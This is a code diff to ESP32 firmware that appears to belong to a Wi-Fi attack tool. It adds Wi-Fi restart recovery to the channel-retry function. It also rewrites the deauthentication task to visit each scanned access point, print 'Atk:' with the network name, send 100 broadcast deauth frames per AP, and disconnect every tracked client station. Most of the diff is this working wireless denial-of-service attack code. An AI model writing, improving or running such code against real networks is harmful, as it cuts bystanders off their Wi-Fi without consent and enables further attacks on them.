@@ -2088,9 +2088,28 @@ bool wifi_set_channel_with_retry(int channel, int max_retries, int delay_ms) {
         if (err == ESP_OK) {
             return true; // Success
         }
-        printf("Retry %d: Failed to set channel %d: %s\n", attempt + 1, channel, esp_err_to_name(err));
+        // printf("Retry %d: Failed to set channel %d: %s\n", attempt + 1, channel, esp_err_to_name(err));
         vTaskDelay(pdMS_TO_TICKS(delay_ms));
     }
+    // printf("Failed to set channel %d after %d retries\n", channel, max_retries);
+    // Restart WiFi as a recovery step
+    vTaskDelay(pdMS_TO_TICKS(10));
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(100));
+    esp_wifi_start();
+    vTaskDelay(pdMS_TO_TICKS(100));
+    // Set mode to AP to ensure proper channel setting
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    vTaskDelay(pdMS_TO_TICKS(100)); 
+    // Try setting the channel
+    for (int attempt = 0; attempt < max_retries; attempt++) {
+        esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        if (err == ESP_OK) {
+            return true; // Success after recovery
+        }
+        vTaskDelay(pdMS_TO_TICKS(delay_ms));
+    }
+    printf("ERROR: Unable to set channel %d after recovery attempts\n", channel);
     return false; // All retries failed
 }
 
@@ -2223,28 +2242,47 @@ void wifi_deauth_task(void *param) {
                 }
             }
         } else {
-            for (int ch = 1; ch <= MAX_WIFI_CHANNEL; ch++) {
-                bool channel_set = false;
-                for (int i = 0; i < ap_count; i++) {
-                    if (ap_info[i].primary == ch) {
-                        if (!channel_set) {
-                            vTaskDelay(pdMS_TO_TICKS(50)); // Wait for channel to stabilize
-                            bool success = wifi_set_channel_with_retry(ch, 3, 20);
-                            if (!success) {
-                                printf("ERROR: Failed to set channel %d after retries\n", ch);
-                                continue; // Skip this channel
-                            }
-                            channel_set = true;
-                        }
-                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
-                        for (int j = 0; j < station_count; j++) {
-                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
-                            }
-                        }
+            // AP-first iteration: process each scanned AP directly
+            for (int i = 0; i < ap_count; i++) {
+                int ch = ap_info[i].primary;
+                if (ch < 1 || ch > MAX_WIFI_CHANNEL) continue; // invalid channel
+
+                // Get current channel
+                uint8_t current_ch;
+                esp_wifi_get_channel(&current_ch, NULL);
+                // Set channel if different
+                if (ch != current_ch) {
+                    bool success = wifi_set_channel_with_retry(ch, 3, 20);
+                    if (!success) {
+                        printf("ERROR: Failed to set channel %d after retries\n", ch);
+                        vTaskDelay(pdMS_TO_TICKS(50));
+                        continue; // Skip this AP
+                    }
+                    vTaskDelay(pdMS_TO_TICKS(50)); // Wait for channel to stabilize
+                }
+
+                // Print current AP info
+                char sanitized_ssid[33];
+                sanitize_ssid_and_check_hidden(ap_info[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
+                printf("Atk: %s, ch %d\n",
+                       sanitized_ssid, ch);
+
+                // Broadcast deauth to AP (broadcast MAC)
+                const int broadcast_per_ap = 100;
+                for (int b = 0; b < broadcast_per_ap; b++) {
+                    wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
+                    vTaskDelay(pdMS_TO_TICKS(10));
+                }
+                // wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
+
+                // Deauth tracked stations associated with this AP
+                for (int j = 0; j < station_count; j++) {
+                    if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                     }
                 }
-                if (channel_set) vTaskDelay(pdMS_TO_TICKS(10));
+
+                vTaskDelay(pdMS_TO_TICKS(100));
             }
         }
         vTaskDelay(pdMS_TO_TICKS(50));
@@ -2267,7 +2305,7 @@ void wifi_manager_start_deauth() {
     if (!beacon_task_running) {
         ap_manager_stop_services();
         esp_wifi_start();
-        vTaskDelay(pdMS_TO_TICKS(200)); // Wait for WiFi to fully initialize
+        vTaskDelay(pdMS_TO_TICKS(500)); // Wait for WiFi to fully initialize
         printf("Restarting Wi-Fi\n");
 #ifdef CONFIG_WITH_STATUS_DISPLAY
         status_display_show_attack("Deauth", "starting");
